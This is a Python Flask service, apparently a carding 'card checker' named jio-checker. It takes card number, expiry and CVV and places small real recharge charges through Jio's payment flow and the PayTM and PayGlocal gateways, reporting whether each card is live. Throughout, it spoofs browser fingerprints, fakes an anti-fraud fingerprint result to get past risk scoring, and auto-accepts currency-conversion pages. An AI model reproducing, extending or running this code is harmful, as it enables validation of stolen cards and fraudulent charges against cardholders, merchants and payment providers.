import re, time, random
from curl_cffi import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

PROFILES = [
    {"imp":"chrome131","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","ch":'"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"',"plat":'"Windows"',"mob":"?0"},
    {"imp":"chrome124","ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","ch":'"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"',"plat":'"macOS"',"mob":"?0"},
    {"imp":"chrome123","ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36","ch":'"Google Chrome";v="123", "Not_A Brand";v="8", "Chromium";v="123"',"plat":'"Linux"',"mob":"?0"},
]
SCREENS = [{"h":1080,"w":1920,"depth":24},{"h":768,"w":1366,"depth":24},{"h":900,"w":1440,"depth":30}]
LANGS = ["en-US,en;q=0.9","en-IN,en;q=0.9,en-US;q=0.8","en-GB,en;q=0.9"]

SKIP_PHRASES = [
    'redirect','please do not click','do not press','javascript',
    'refresh','back button','please wait','may take','upto','seconds',
    'redirecting','payment gateway','do not click','do not refresh',
    'processing','loading','please stand','moment','transaction is being',
    'being processed','initiated','in progress','these terms','dynamic currency',
    'dcc','irrevocably','herein','accessing or using'
]

def ts():
    return str(int(time.time() * 1000))

def is_dcc_page(html):
    h = html.lower()
    return "dynamic currency conversion" in h or ("dcc" in h and "terms" in h and "irrevocably" in h)

def bypass_dcc(session, html, current_url, jh_func):
    fa = re.search(r"action=['\"]([^'\"]+)['\"]", html)
    fi = re.findall(r"<input[^>]+name=['\"]([^'\"]+)['\"][^>]*value=['\"]([^'\"]*)['\"]", html, re.IGNORECASE)
    if not fi:
        fi = re.findall(r"<input[^>]+value=['\"]([^'\"]*)['\"][^>]*name=['\"]([^'\"]+)['\"]", html, re.IGNORECASE)
        fi = [(b, a) for a, b in fi]
    if fa:
        dcc_url = fa.group(1)
        if not dcc_url.startswith("http"):
            base = re.match(r"(https?://[^/]+)", current_url)
            if base:
                dcc_url = base.group(1) + dcc_url
        dcc_data = {k:v for k,v in fi}
        origin = re.match(r"(https?://[^/]+)", current_url)
        r = session.post(dcc_url,
            headers=jh_func(current_url, ct="application/x-www-form-urlencoded",
                origin=origin.group(1) if origin else None,
                extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                       "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate",
                       "Sec-Fetch-Site":"same-origin","Upgrade-Insecure-Requests":"1"}),
            data=dcc_data, allow_redirects=True, timeout=60)
        return r
    return None

def extract_raw(html):
    matches = re.findall(r'<p[^>]*>([^<]{20,})</p>', html, re.IGNORECASE)
    for m in matches:
        t = m.strip()
        if t and not any(x in t.lower() for x in SKIP_PHRASES):
            return t
    matches = re.findall(r'<p[^>]*>([^<]{10,})</p>', html, re.IGNORECASE)
    for m in matches:
        t = m.strip()
        if t and not any(x in t.lower() for x in SKIP_PHRASES):
            return t
    matches = re.findall(r'<(?:h2|h3|span)[^>]*>([^<]{10,})</(?:h2|h3|span)>', html, re.IGNORECASE)
    for m in matches:
        t = m.strip()
        if t and not any(x in t.lower() for x in SKIP_PHRASES):
            return t
    return None

def parse_paytm_result(html):
    h = html.lower()
    raw = extract_raw(html)
    if "recharge successful" in h or "transaction successful" in h or "payment successful" in h:
        return "charged", "Recharge Successful"
    elif "enough balance" in h or "insufficient" in h or "not enough" in h or "does not have enough" in h or "add balance" in h:
        return "insufficient", raw or "Insufficient balance"
    elif "transaction limit" in h or "exceeded" in h:
        return "declined", raw or "Transaction limit exceeded"
    elif "gateway risk" in h or "risk decline" in h:
        return "declined", raw or "Gateway risk decline"
    elif "acs" in h or "data-beasties-container" in h:
        return "declined", raw or "3DS ACS required"
    elif "3ds_method_required" in h:
        return "declined", raw or "3DS required"
    elif "issuer" in h:
        return "declined", raw or "Issuer declined"
    elif "card provider" in h or "provider declined" in h:
        return "declined", raw or "Card provider declined"
    elif "bank" in h and "declined" in h:
        return "declined", raw or "Bank declined"
    elif "do not honor" in h:
        return "declined", raw or "Do not honor"
    elif "transaction failed" in h or "payment failed" in h or "declined" in h or "failed" in h:
        return "declined", raw or "Card declined"
    elif "processing" in h or "please wait" in h or "do not press" in h:
        return "3d", raw or "3DS processing"
    else:
        return "error", raw or f"PayTM: {html[:200]}"

def find_plan(pj, amount):
    best_key = None
    best_amount = None
    best_diff = float('inf')
    for cat in pj.get("planCategories") or []:
        for sub in cat.get("subCategories") or []:
            for plan in sub.get("plans") or []:
                if plan.get("key"):
                    plan_amt = float(plan.get("amount") or 0)
                    diff = abs(plan_amt - float(amount))
                    if diff < 5 and diff < best_diff:
                        best_diff = diff
                        best_key = plan["key"]
                        best_amount = plan_amt
    return best_key, best_amount or amount

def get_available_plans(pj):
    amounts = []
    for cat in pj.get("planCategories") or []:
        for sub in cat.get("subCategories") or []:
            for plan in sub.get("plans") or []:
                if plan.get("key") and plan.get("amount"):
                    amt = float(plan.get("amount"))
                    if amt not in amounts:
                        amounts.append(amt)
    amounts.sort()
    return amounts

def check_card(cc, number, amount=19):
    start = time.time()
    parts = cc.split("|")
    if len(parts) != 4:
        return {"response":"error","real-response":"Invalid card format","gateway":"unknown","time":0,"price":f"₹{amount}","cc":cc,"number":number}

    card_num, mm, yy, cvv = parts
    if len(yy) == 2:
        yy = "20" + yy

    pf = random.choice(PROFILES)
    sc = random.choice(SCREENS)
    lg = random.choice(LANGS)
    UA = pf["ua"]
    IMP = pf["imp"]
    SEC = pf["ch"]
    PLAT = pf["plat"]
    MOB = pf["mob"]
    card_prefix = card_num[:6]
    card_type = "visa" if card_num[0] == "4" else "mastercard"

    def jh(ref, ct=None, origin=None, extra=None):
        h = {"Accept-Language":lg,"Cache-Control":"no-cache","Connection":"keep-alive","Pragma":"no-cache",
             "Referer":ref,"User-Agent":UA,"sec-ch-ua":SEC,"sec-ch-ua-mobile":MOB,"sec-ch-ua-platform":PLAT}
        if ct: h["Content-Type"] = ct
        if origin: h["Origin"] = origin
        if extra: h.update(extra)
        return h

    def ph(ref, ct=None, origin=None, extra=None):
        h = {"Accept":"application/json, text/plain, */*","Accept-Language":lg,"Cache-Control":"no-cache",
             "Pragma":"no-cache","Referer":ref,"User-Agent":UA,"sec-ch-ua":SEC,"sec-ch-ua-mobile":MOB,
             "sec-ch-ua-platform":PLAT,"Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors",
             "Sec-Fetch-Site":"same-origin","x-request-time":ts()}
        if ct: h["Content-Type"] = ct
        if origin: h["Origin"] = origin
        if extra: h.update(extra)
        return h

    try:
        session = requests.Session(impersonate=IMP)

        session.get("https://www.jio.com/",
            headers={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":lg,"Upgrade-Insecure-Requests":"1","User-Agent":UA,"sec-ch-ua":SEC,"sec-ch-ua-mobile":MOB,"sec-ch-ua-platform":PLAT},
            timeout=30)

        r2 = session.get(f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{number}",
            headers=jh("https://www.jio.com/",extra={"Accept":"application/json, text/plain, */*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
            timeout=30)
        d2 = r2.json()
        if d2.get("errorMessage") == "NOT_SUBSCRIBED_USER":
            return {"cc":cc,"response":"error","real-response":"Not a JIO number","gateway":"unknown","price":f"₹{amount}","time":round(time.time()-start,2),"number":number}
        billing_type = d2.get("billingType","PREPAID")
        next_value = d2.get("nextPage", billing_type)
        plans_ref = f"https://www.jio.com/selfcare/recharge/mobility/plans/?serviceType=mobility&serviceId={number}&next={next_value}&billingType={billing_type}&entrysource=Widget"

        session.get("https://www.jio.com/selfcare/recharge/mobility/plans/",
            params={"serviceType":"mobility","serviceId":number,"next":next_value,"billingType":billing_type,"entrysource":"Widget"},
            headers=jh("https://www.jio.com/",extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"same-origin","Upgrade-Insecure-Requests":"1"}),
            timeout=30)

        r4 = session.get(f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{number}",
            headers=jh(plans_ref,extra={"Accept":"application/json, text/plain, */*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
            timeout=30)

        plan_data = r4.json()
        plan_key, actual_amount = find_plan(plan_data, amount)
        if not plan_key:
            available = get_available_plans(plan_data)
            avail_str = " • ".join([f"₹{int(a)}" for a in available[:10]])
            return {"cc":cc,"response":"error","real-response":f"₹{amount} not available. Plans: {avail_str}","gateway":"unknown","price":f"₹{amount}","time":round(time.time()-start,2),"number":number}

        amount = actual_amount

        r5 = session.post("https://www.jio.com/api/jio-recharge-service/recharge/buy",
            headers=jh(plans_ref,ct="application/json",origin="https://www.jio.com",extra={"Accept":"*/*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
            json={"planKey":plan_key,"selectedService":number}, timeout=30)
        if r5.status_code != 200:
            return {"cc":cc,"response":"error","real-response":"Buy failed","gateway":"unknown","price":f"₹{amount}","time":round(time.time()-start,2),"number":number}

        r6 = session.post("https://www.jio.com/api/jio-recharge-service/recharge/pay",
            headers=jh(plans_ref,ct="application/json",origin="https://www.jio.com",extra={"Accept":"*/*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
            json={"addonPlanKeys":[],"flexiTopupFlow":False,"servicePlanList":[{"planKey":plan_key,"quantity":1,"serviceId":number}]},
            timeout=30)
        payment_url = r6.json().get("paymentURL","https://www.jio.com/api/jio-common-servlet/jiocommon/redirect")

        r7 = session.get(payment_url,
            headers=jh(plans_ref,extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"same-origin","Upgrade-Insecure-Requests":"1"}),
            allow_redirects=True, timeout=30)
        fa = re.search(r"action='([^']+)'", r7.text)
        fi = re.findall(r"name='([^']+)'\s+value='([^']*)'", r7.text)
        pay_form_url = fa.group(1) if fa else "https://pay.jio.com/jiopg/v1/payment-options"
        pay_form_data = {k:v for k,v in fi}

        r8 = session.post(pay_form_url,
            headers=jh("https://www.jio.com/",ct="application/x-www-form-urlencoded",origin="https://www.jio.com",extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"cross-site","Upgrade-Insecure-Requests":"1"}),
            data=pay_form_data, allow_redirects=True, timeout=30)
        pay_jio_ref = r8.url

        r9 = session.post("https://pay.jio.com/jiopg/v1/authorize-card-operation",
            headers=jh(pay_jio_ref,ct="application/json",origin="https://pay.jio.com",extra={"Accept":"application/json","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
            json={"paymentMode":"CCDC","cardPrefix":card_prefix,"isEMISelected":False,"viewOffer":False,"skuCode":None,"copco":None,"isStoreCreditSelected":None},
            timeout=30)
        x_token = r9.json().get("token","")
        if not x_token:
            return {"cc":cc,"response":"error","real-response":"No X-Token","gateway":"unknown","price":f"₹{amount}","time":round(time.time()-start,2),"number":number}

        r10 = session.post("https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
            headers=jh(pay_jio_ref,ct="application/json",origin="https://pay.jio.com",extra={"Accept":"application/json","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin","x-token":x_token}),
            json={"cvvNumber":cvv,"cashBackApplied":"N","isTrxnStatusCheckEnable":"N","seqId":"","ccRoutePg":"",
                  "customerCardTypeValue":card_type,"paymentMode":"CCDC","offerAppliedByCust":False,"viewOffer":False,
                  "cardType":f"ic_{card_type}","cardNumber":card_num,"cardTypeText":"VISA_CARD" if card_num[0]=="4" else "MASTERCARD_CARD",
                  "expiryMonth":mm,"expiryYear":yy,"cardHolderName":"cardholder","userCardSaveConsent":False,
                  "browserDetails":{"browserHeader":"application/json","browserJavaEnabled":False,"browserJavascriptEnabled":True,
                      "browserLanguage":lg.split(",")[0],"browserColorDepth":sc["depth"],
                      "browserScreenHeight":sc["h"],"browserScreenWidth":sc["w"],"browserTz":-330,"browserUserAgent":UA}},
            timeout=60)
        d10 = r10.json()
        if not d10.get("status"):
            msg = d10.get("message","Card confirmation failed")
            return {"cc":cc,"response":"error","real-response":msg,"gateway":"unknown","price":f"₹{amount}","time":round(time.time()-start,2),"number":number}

        html_form = d10.get("htmlForm","")

        with open("/root/debug.txt","w") as f:
            f.write(html_form)

        if "payglocal" in html_form or "easebuzz" in html_form:
            gateway = "PayGlocal"
        elif "paytmpayments.com" in html_form or "paytmpayments.in" in html_form or "securegw.paytm" in html_form:
            gateway = "PayTM"
        elif "wlp-acs.com" in html_form or "acs-challenge" in html_form or "creq" in html_form:
            gateway = "PayTM"
        else:
            gateway = "unknown"

        if "wlp-acs.com" in html_form or "acs-challenge" in html_form or "creq" in html_form:
            return {"cc":cc,"response":"declined","real-response":"3DS ACS challenge required","gateway":gateway,"price":f"₹{amount}","time":round(time.time()-start,2),"number":number}

        ea = re.search(r"action='([^']+)'", html_form)
        ei = re.findall(r"name='([^']+)'\s+value='([^']*)'", html_form)
        form_url = ea.group(1) if ea else ""
        form_data = {k:v for k,v in ei}

        if not form_url:
            return {"cc":cc,"response":"error","real-response":f"Unknown gateway: {html_form[:100]}","gateway":gateway,"price":f"₹{amount}","time":round(time.time()-start,2),"number":number}

        r11 = session.post(form_url,
            headers=jh(pay_jio_ref,ct="application/x-www-form-urlencoded",origin="https://pay.jio.com",
                extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                       "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"cross-site","Upgrade-Insecure-Requests":"1"}),
            data=form_data, allow_redirects=True, timeout=60)

        if is_dcc_page(r11.text):
            dcc_result = bypass_dcc(session, r11.text, r11.url, jh)
            if dcc_result:
                r11 = dcc_result
            else:
                return {"cc":cc,"response":"insufficient","real-response":"Insufficient funds","gateway":gateway,"price":f"₹{amount}","time":round(time.time()-start,2),"number":number}

        if gateway == "PayTM":
            html11 = r11.text
            resp_code, resp_msg = parse_paytm_result(html11)
            if resp_code == "3d":
                fa3 = re.search(r"action='([^']+)'", html11)
                fi3 = re.findall(r"name='([^']+)'\s+value='([^']*)'", html11)
                if fa3 and fi3:
                    form_url3 = fa3.group(1)
                    form_data3 = {k:v for k,v in fi3}
                    r12 = session.post(form_url3,
                        headers=jh(r11.url,ct="application/x-www-form-urlencoded",origin="https://securepay.paytmpayments.com",
                            extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                   "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"same-origin","Upgrade-Insecure-Requests":"1"}),
                        data=form_data3, allow_redirects=True, timeout=60)
                    resp_code, resp_msg = parse_paytm_result(r12.text)
            return {"cc":cc,"response":resp_code,"real-response":resp_msg,"gateway":"PayTM","price":f"₹{amount:.2f}","time":round(time.time()-start,2),"number":number}

        elif gateway == "PayGlocal":
            combined = r11.url + (r11.text or "")
            m = re.search(r'x-gl-token=([^&\s"\'\\]+)', combined)
            if not m:
                return {"cc":cc,"response":"error","real-response":"PayGlocal token missing","gateway":"PayGlocal","price":f"₹{amount}","time":round(time.time()-start,2),"number":number}
            gl_token = m.group(1)
            gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"

            session.get("https://api.payglocal.com/gl/v2/payments/redirect/dc",
                params={"x-gl-token":gl_token},
                headers=ph(gl_ref,extra={"x-gl-current-host":"api.payglocal.com","x-gl-gid":"gl_payflow-ui","x-gl-pb-tag-id":"",
                    "x-gl-previous-host":"https://pay.easebuzz.in/","x-gl-referrer-mismatch":"false","x-gl-trusted-referrer":"https://pay.easebuzz.in"}),
                timeout=30)

            session.post("https://api.payglocal.com/gl/v2/payments/pd/paynow",
                params={"x-gl-token":gl_token},
                headers=ph(gl_ref,ct="application/json",origin="https://api.payglocal.com"),
                json={"isEnc":"false","payload":{"customerCurrency":"INR","saveCurrencyPreference":False,
                    "browserDetails":{"colorDepth":sc["depth"],"javaEnabled":False,"javaScripEnabled":True,
                        "language":lg.split(",")[0],"screenHeight":sc["h"],"screenWidth":sc["w"],"timeZone":-330},
                    "billingData":{"addressCountry":"FR"},"shippingData":{},"agreedOnTnCs":True}},
                timeout=30)

            r_risk = session.post("https://api.payglocal.com/gl/v1/payments/risk/fp",
                params={"x-gl-token":gl_token},
                headers=ph(gl_ref,ct="application/json",origin="https://api.payglocal.com"),
                json={"requestId":f"{ts()}.{random.randint(100000,999999)}","visitorId":"Y8c4sEunqz0opl0b6YAd","visitorFound":True,"confidenceScore":1},
                timeout=30)
            kid = r_risk.json().get("data",{}).get("kid","")
            if not kid:
                return {"cc":cc,"response":"error","real-response":"PayGlocal risk failed","gateway":"PayGlocal","price":f"₹{amount}","time":round(time.time()-start,2),"number":number}

            time.sleep(random.uniform(0.5,1.2))
            r_pay = session.post("https://api.payglocal.com/gl/v2/payments/dc/ipay",
                params={"x-gl-token":gl_token},
                headers=ph(gl_ref,ct="application/json",origin="https://api.payglocal.com"),
                json={"isEnc":"false","kid":kid,"payload":{
                    "cardNumber":card_num,"expiryMonth":mm,"expiryYear":yy,"cvv":cvv,
                    "cardHolderName":"cardholder","saveCard":False,
                    "browserDetails":{"colorDepth":sc["depth"],"javaEnabled":False,"javaScriptEnabled":True,
                        "language":lg.split(",")[0],"screenHeight":sc["h"],"screenWidth":sc["w"],
                        "timeZone":-330,"userAgent":UA}}},
                timeout=60)
            result = r_pay.json()
            status = result.get("status","")
            message = result.get("message","")
            reason = result.get("reasonCode","")
            raw_msg = f"{message} {reason}".strip() if reason else message
            real_amount = result.get("amount") or result.get("txnAmount") or amount
            try:
                real_amount = float(real_amount)
            except:
                real_amount = amount

            if status in ("SUCCESS","APPROVED"):
                return {"cc":cc,"response":"charged","real-response":"Recharge Successful","gateway":"PayGlocal","price":f"₹{real_amount:.2f}","time":round(time.time()-start,2),"number":number}
            elif "INSUFFICIENT" in reason or "insufficient" in message.lower() or "enough balance" in message.lower():
                return {"cc":cc,"response":"insufficient","real-response":raw_msg or "Insufficient funds","gateway":"PayGlocal","price":f"₹{real_amount:.2f}","time":round(time.time()-start,2),"number":number}
            elif "RISK" in reason or "risk" in message.lower():
                return {"cc":cc,"response":"declined","real-response":raw_msg or "Gateway risk decline","gateway":"PayGlocal","price":f"₹{real_amount:.2f}","time":round(time.time()-start,2),"number":number}
            elif "3DS_METHOD_REQUIRED" in reason or "3ds" in message.lower():
                return {"cc":cc,"response":"declined","real-response":raw_msg or "3DS required","gateway":"PayGlocal","price":f"₹{real_amount:.2f}","time":round(time.time()-start,2),"number":number}
            elif "ISSUER" in reason:
                return {"cc":cc,"response":"declined","real-response":raw_msg or "Issuer declined","gateway":"PayGlocal","price":f"₹{real_amount:.2f}","time":round(time.time()-start,2),"number":number}
            elif raw_msg:
                return {"cc":cc,"response":"declined","real-response":raw_msg,"gateway":"PayGlocal","price":f"₹{real_amount:.2f}","time":round(time.time()-start,2),"number":number}
            else:
                return {"cc":cc,"response":"error","real-response":"Unknown PayGlocal response","gateway":"PayGlocal","price":f"₹{real_amount:.2f}","time":round(time.time()-start,2),"number":number}

        return {"cc":cc,"response":"error","real-response":f"Unknown gateway: {html_form[:100]}","gateway":"unknown","price":f"₹{amount}","time":round(time.time()-start,2),"number":number}

    except Exception as e:
        return {"cc":cc,"response":"error","real-response":str(e)[:80],"gateway":"unknown","price":f"₹{amount}","time":round(time.time()-start,2),"number":number}

@app.route("/check", methods=["GET","POST"])
def check():
    if request.method == "GET":
        cc = request.args.get("cc")
        number = request.args.get("number")
        amount = int(request.args.get("amount",19))
    else:
        data = request.json or {}
        cc = data.get("cc")
        number = data.get("number")
        amount = int(data.get("amount",19))
    if not cc or not number:
        return jsonify({"error":"cc and number required"}),400
    for attempt in range(2):
        result = check_card(cc, number, amount)
        if result.get("response") != "error" or "timeout" not in result.get("real-response","").lower():
            break
    return jsonify(result)

@app.route("/")
def index():
    return jsonify({"service":"jio-checker","version":"5.0"})

if __name__ == "__main__":
    app.run(host="0.0.0.0",port=5000,debug=False)